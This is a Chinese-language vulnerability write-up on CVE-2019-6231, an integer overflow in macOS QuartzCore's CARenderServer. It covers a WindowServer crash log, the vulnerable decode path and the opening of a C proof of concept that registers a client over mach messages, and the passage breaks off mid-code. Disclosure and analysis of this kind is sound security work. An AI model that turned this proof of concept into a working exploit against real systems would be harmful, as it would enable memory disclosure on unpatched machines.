在2019年1月22日，Apple发布了macOS Mojave 10.14.3和iOS 12.1.3版本。
这两个版本修复了许多安全漏洞，包括`QuartzCore`（又名`CoreAnimation`）中的`CVE-2019-6231`。
（有关Apple更新的更多详细信息，请访问： 和）
研究人员在2018年12月14日的macOS Mojave
10.14.2中发现了这个漏洞，并于2018年12月21日向苹果公司报告了这个问题。然而，Apple回答说这个问题已在12月发布的macOS Mojave
10.14.3测试版中得到修复。 在这篇博客中，我将在macOS上详细分析此漏洞。
### 快速回顾
`QuartzCore`，也称为`CoreAnimation`，是macOS和iOS用来创建动画场景图形的框架。`CoreAnimation`使用独特的渲染模型，其中图形操作是单独运行的。在macOS上，该过程类似于WindowServer。在iOS上，该过程是在后台运行的。`QuartzCore`中名为`com.apple.CARenderServer`的服务通常被称为`CARenderServer`。
此服务存在于macOS和iOS中，普通用户可以从Safari Sandbox处访问。
当`QuartzCore`处理函数`CA::Render::Image::decode()`中的图像对象时，也存在整数溢出的情况。
这会导致恶意应用程序能够读取受限制的内存。
以下是触发此问题时进程WindowServer的奔溃日志。
    Process:               WindowServer [57329]
    Path:                  /System/Library/PrivateFrameworks/SkyLight.framework/Versions/A/Resources/WindowServer
    Identifier:            WindowServer
    Version:               600.00 (337.5)
    Code Type:             X86-64 (Native)
    Parent Process:        launchd [1]
    Responsible:           WindowServer [57329]
    User ID:               88
    Date/Time:             2018-12-14 16:51:08.093 -0800
    OS Version:            Mac OS X 10.14.2 (18C54)
    Report Version:        12
    Anonymous UUID:        0D2EB0AC-26C3-9DBB-CEF0-0060FA5B3A8B
    Sleep/Wake UUID:       7F5E9869-8B81-4B2F-8BBC-54048DE83A26
    Time Awake Since Boot: 15000 seconds
    Time Since Wake:       7000 seconds
    System Integrity Protection: disabled
    Crashed Thread:        2  com.apple.coreanimation.render-server
    Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
    Exception Codes:       KERN_INVALID_ADDRESS at 0x0000008000000018
    Exception Note:        EXC_CORPSE_NOTIFY
    Termination Signal:    Segmentation fault: 11
    Termination Reason:    Namespace SIGNAL, Code 0xb
    Terminating Process:   exc handler [57329]
外部修改警告：
外部任务创建线程。
调试器附加到进程。
    VM Regions Near 0x8000000018:
        CoreAnimation          00000001b692e000-00000001bb837000 [ 79.0M] rw-/rw- SM=PRV 
    -->
        STACK GUARD            0000700009f5e000-0000700009f5f000 [    4K] ---/rwx SM=NUL  stack guard for thread 6
特定的应用信息：
    StartTime:2018-12-14 16:28:00
    GPU:IG
    MetalDevice for accelerator(0x3633): 0x7fd12a62bd58 (MTLDevice: 0x7fd12b035c00)
    IOService:/AppleACPIPlatformExpert/PCI0@0/AppleACPIPCI/IGPU@2/AppleIntelFramebuffer@0
    Thread 0:: Dispatch queue: com.apple.main-thread
    0   libsystem_kernel.dylib           0x00007fff762f717a mach_msg_trap + 10
    1   libsystem_kernel.dylib           0x00007fff762f76d0 mach_msg + 60
    2   com.apple.SkyLight              0x00007fff6f2c95fc run_one_server_pass + 337
    3   com.apple.SkyLight              0x00007fff6f2c9436 CGXRunOneServicesPass + 460
    4   com.apple.SkyLight              0x00007fff6f2ca0bc server_loop + 96
    5   com.apple.SkyLight              0x00007fff6f2ca055 SLXServer + 1149
    6   WindowServer                        0x000000010d30e4d0 0x10d30d000 + 5328
    7   libdyld.dylib                           0x00007fff761bded9 start + 1
    Thread 1:
    0   libsystem_kernel.dylib           0x00007fff762f717a mach_msg_trap + 10
    1   libsystem_kernel.dylib           0x00007fff762f76d0 mach_msg + 60
    2   com.apple.CoreDisplay                          0x00007fff48f09851 0x7fff48e57000 + 731217
    3   com.apple.CoreDisplay                          0x00007fff48f099af 0x7fff48e57000 + 731567
    4   libsystem_pthread.dylib                         0x00007fff763b1305 _pthread_body + 126
    5   libsystem_pthread.dylib                         0x00007fff763b426f _pthread_start + 70
    6   libsystem_pthread.dylib                         0x00007fff763b0415 thread_start + 13
    Thread 2 Crashed:: com.apple.coreanimation.render-server
    0   com.apple.CoreFoundation                   0x00007fff48f45575 CFRetain + 15
    1   com.apple.QuartzCore                           0x00007fff540e674f CA::Render::Decoder::decode_colorspace() + 87
    2   com.apple.QuartzCore                           0x00007fff5411f826 CA::Render::Texture::decode(CA::Render::Decoder*) + 50
    3   com.apple.QuartzCore                           0x00007fff5400a112 CA::Render::Image::decode(CA::Render::Decoder*) + 1104
    4   com.apple.QuartzCore                           0x00007fff540e6d33 CA::Render::Decoder::decode_object(CA::Render::Type) + 1075
    5   com.apple.QuartzCore                           0x00007fff540e6983 CA::Render::Decoder::decode_object(CA::Render::Type) + 131
    6   com.apple.QuartzCore                           0x00007fff5401d858 CA::Render::Layer::Layer(CA::Render::Decoder*) + 116
    7   com.apple.QuartzCore                           0x00007fff540e6daf CA::Render::Decoder::decode_object(CA::Render::Type) + 1199
    8   com.apple.QuartzCore                           0x00007fff540e78a8 CA::Render::decode_commands(CA::Render::Decoder*) + 329
    9   com.apple.QuartzCore                           0x00007fff5409fb10 CA::Render::Server::ReceivedMessage::run_command_stream() + 748
    10  com.apple.QuartzCore                          0x00007fff53f90358 CA::Render::Server::server_thread(void*) + 1968
    11  com.apple.QuartzCore                          0x00007fff53f8fb92 thread_fun(void*) + 25
    12  libsystem_pthread.dylib                        0x00007fff763b1305 _pthread_body + 126
    13  libsystem_pthread.dylib                        0x00007fff763b426f _pthread_start + 70
    14  libsystem_pthread.dylib                        0x00007fff763b0415 thread_start + 13
    Thread 3:…….
    [truncated]
可以看出，崩溃发生在线程“`com.apple.coreanimation.render-server`”中。
mach服务“`com.apple.CARenderServer`”是在`/System/Library/Frameworks/QuartzCore.framework/Versions/A/QuartzCore`中实现的。
在函数`(CA::Render::Server *this, const char
*a2)`中，它能够注册服务“`com.apple.CARenderServer`”。
服务器线程在函数`CA::Render::Server:: server_thread`中实现。 它用于从客户端接收mach消息，然后处理这些消息。
当线程收到带有msgh_id
40002或40003的mach消息时，这可以调用函数`CA::Render::Server::ReceivedMessage::run_command_stream（CA::Render::Server::ReceivedMessage
*this）`来处理命令。
而此漏洞存在于函数`CA::Render::Server:: ReceivedMessage::
run_command_stream`中处理命令流的过程中。
### 漏洞演示
在下一节中，我将演示如何使用PoC来触发此漏洞。 PoC如下所示。
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct quartz_register_client_s quartz_register_client_t;
    struct quartz_register_client_s {
        mach_msg_header_t header;
        uint32_t body;
        mach_msg_port_descriptor_t ports[4];
        char padding[12];
    };
    typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;
    struct quartzcore_mach_msg{
        mach_msg_header_t header;
        char msg_body[712];
    };
    uint64_t get_filesize(const char *fn){
        struct stat st;
        stat(fn, &st);
        uint64_t fsize = st.st_size;
        return fsize;
    };
    int main(int argc, const char * argv[]) {
        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
        task_get_bootstrap_port(mach_task_self(), &bs_port);
        const char *render_service_name = "com.apple.CARenderServer";
        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, "bootstrap_look_up");
        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &p);
        if (kr != KERN_SUCCESS) {
            return -1;
        }
        printf("[*] Get service of %s successully!\n", render_service_name);
        quartz_register_client_t msg_register;
        memset(&msg_register, 0, sizeof(msg_register));
        msg_register.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |
        MACH_MSGH_BITS_COMPLEX;
        msg_register.header.msgh_remote_port = p;
        msg_register.header.msgh_local_port = mig_get_reply_port();
        msg_register.header.msgh_id = 40202;  // _XRegisterClient
        msg_register.body = 4;
        msg_register.ports[0].name = mach_task_self();
        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[1].name = mach_task_self();
        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[2].name = mach_task_self();
        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[3].name = mach_task_self();
        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;
        kr = mach_msg(&msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,
                      sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),
                      msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            return -1 ;
        }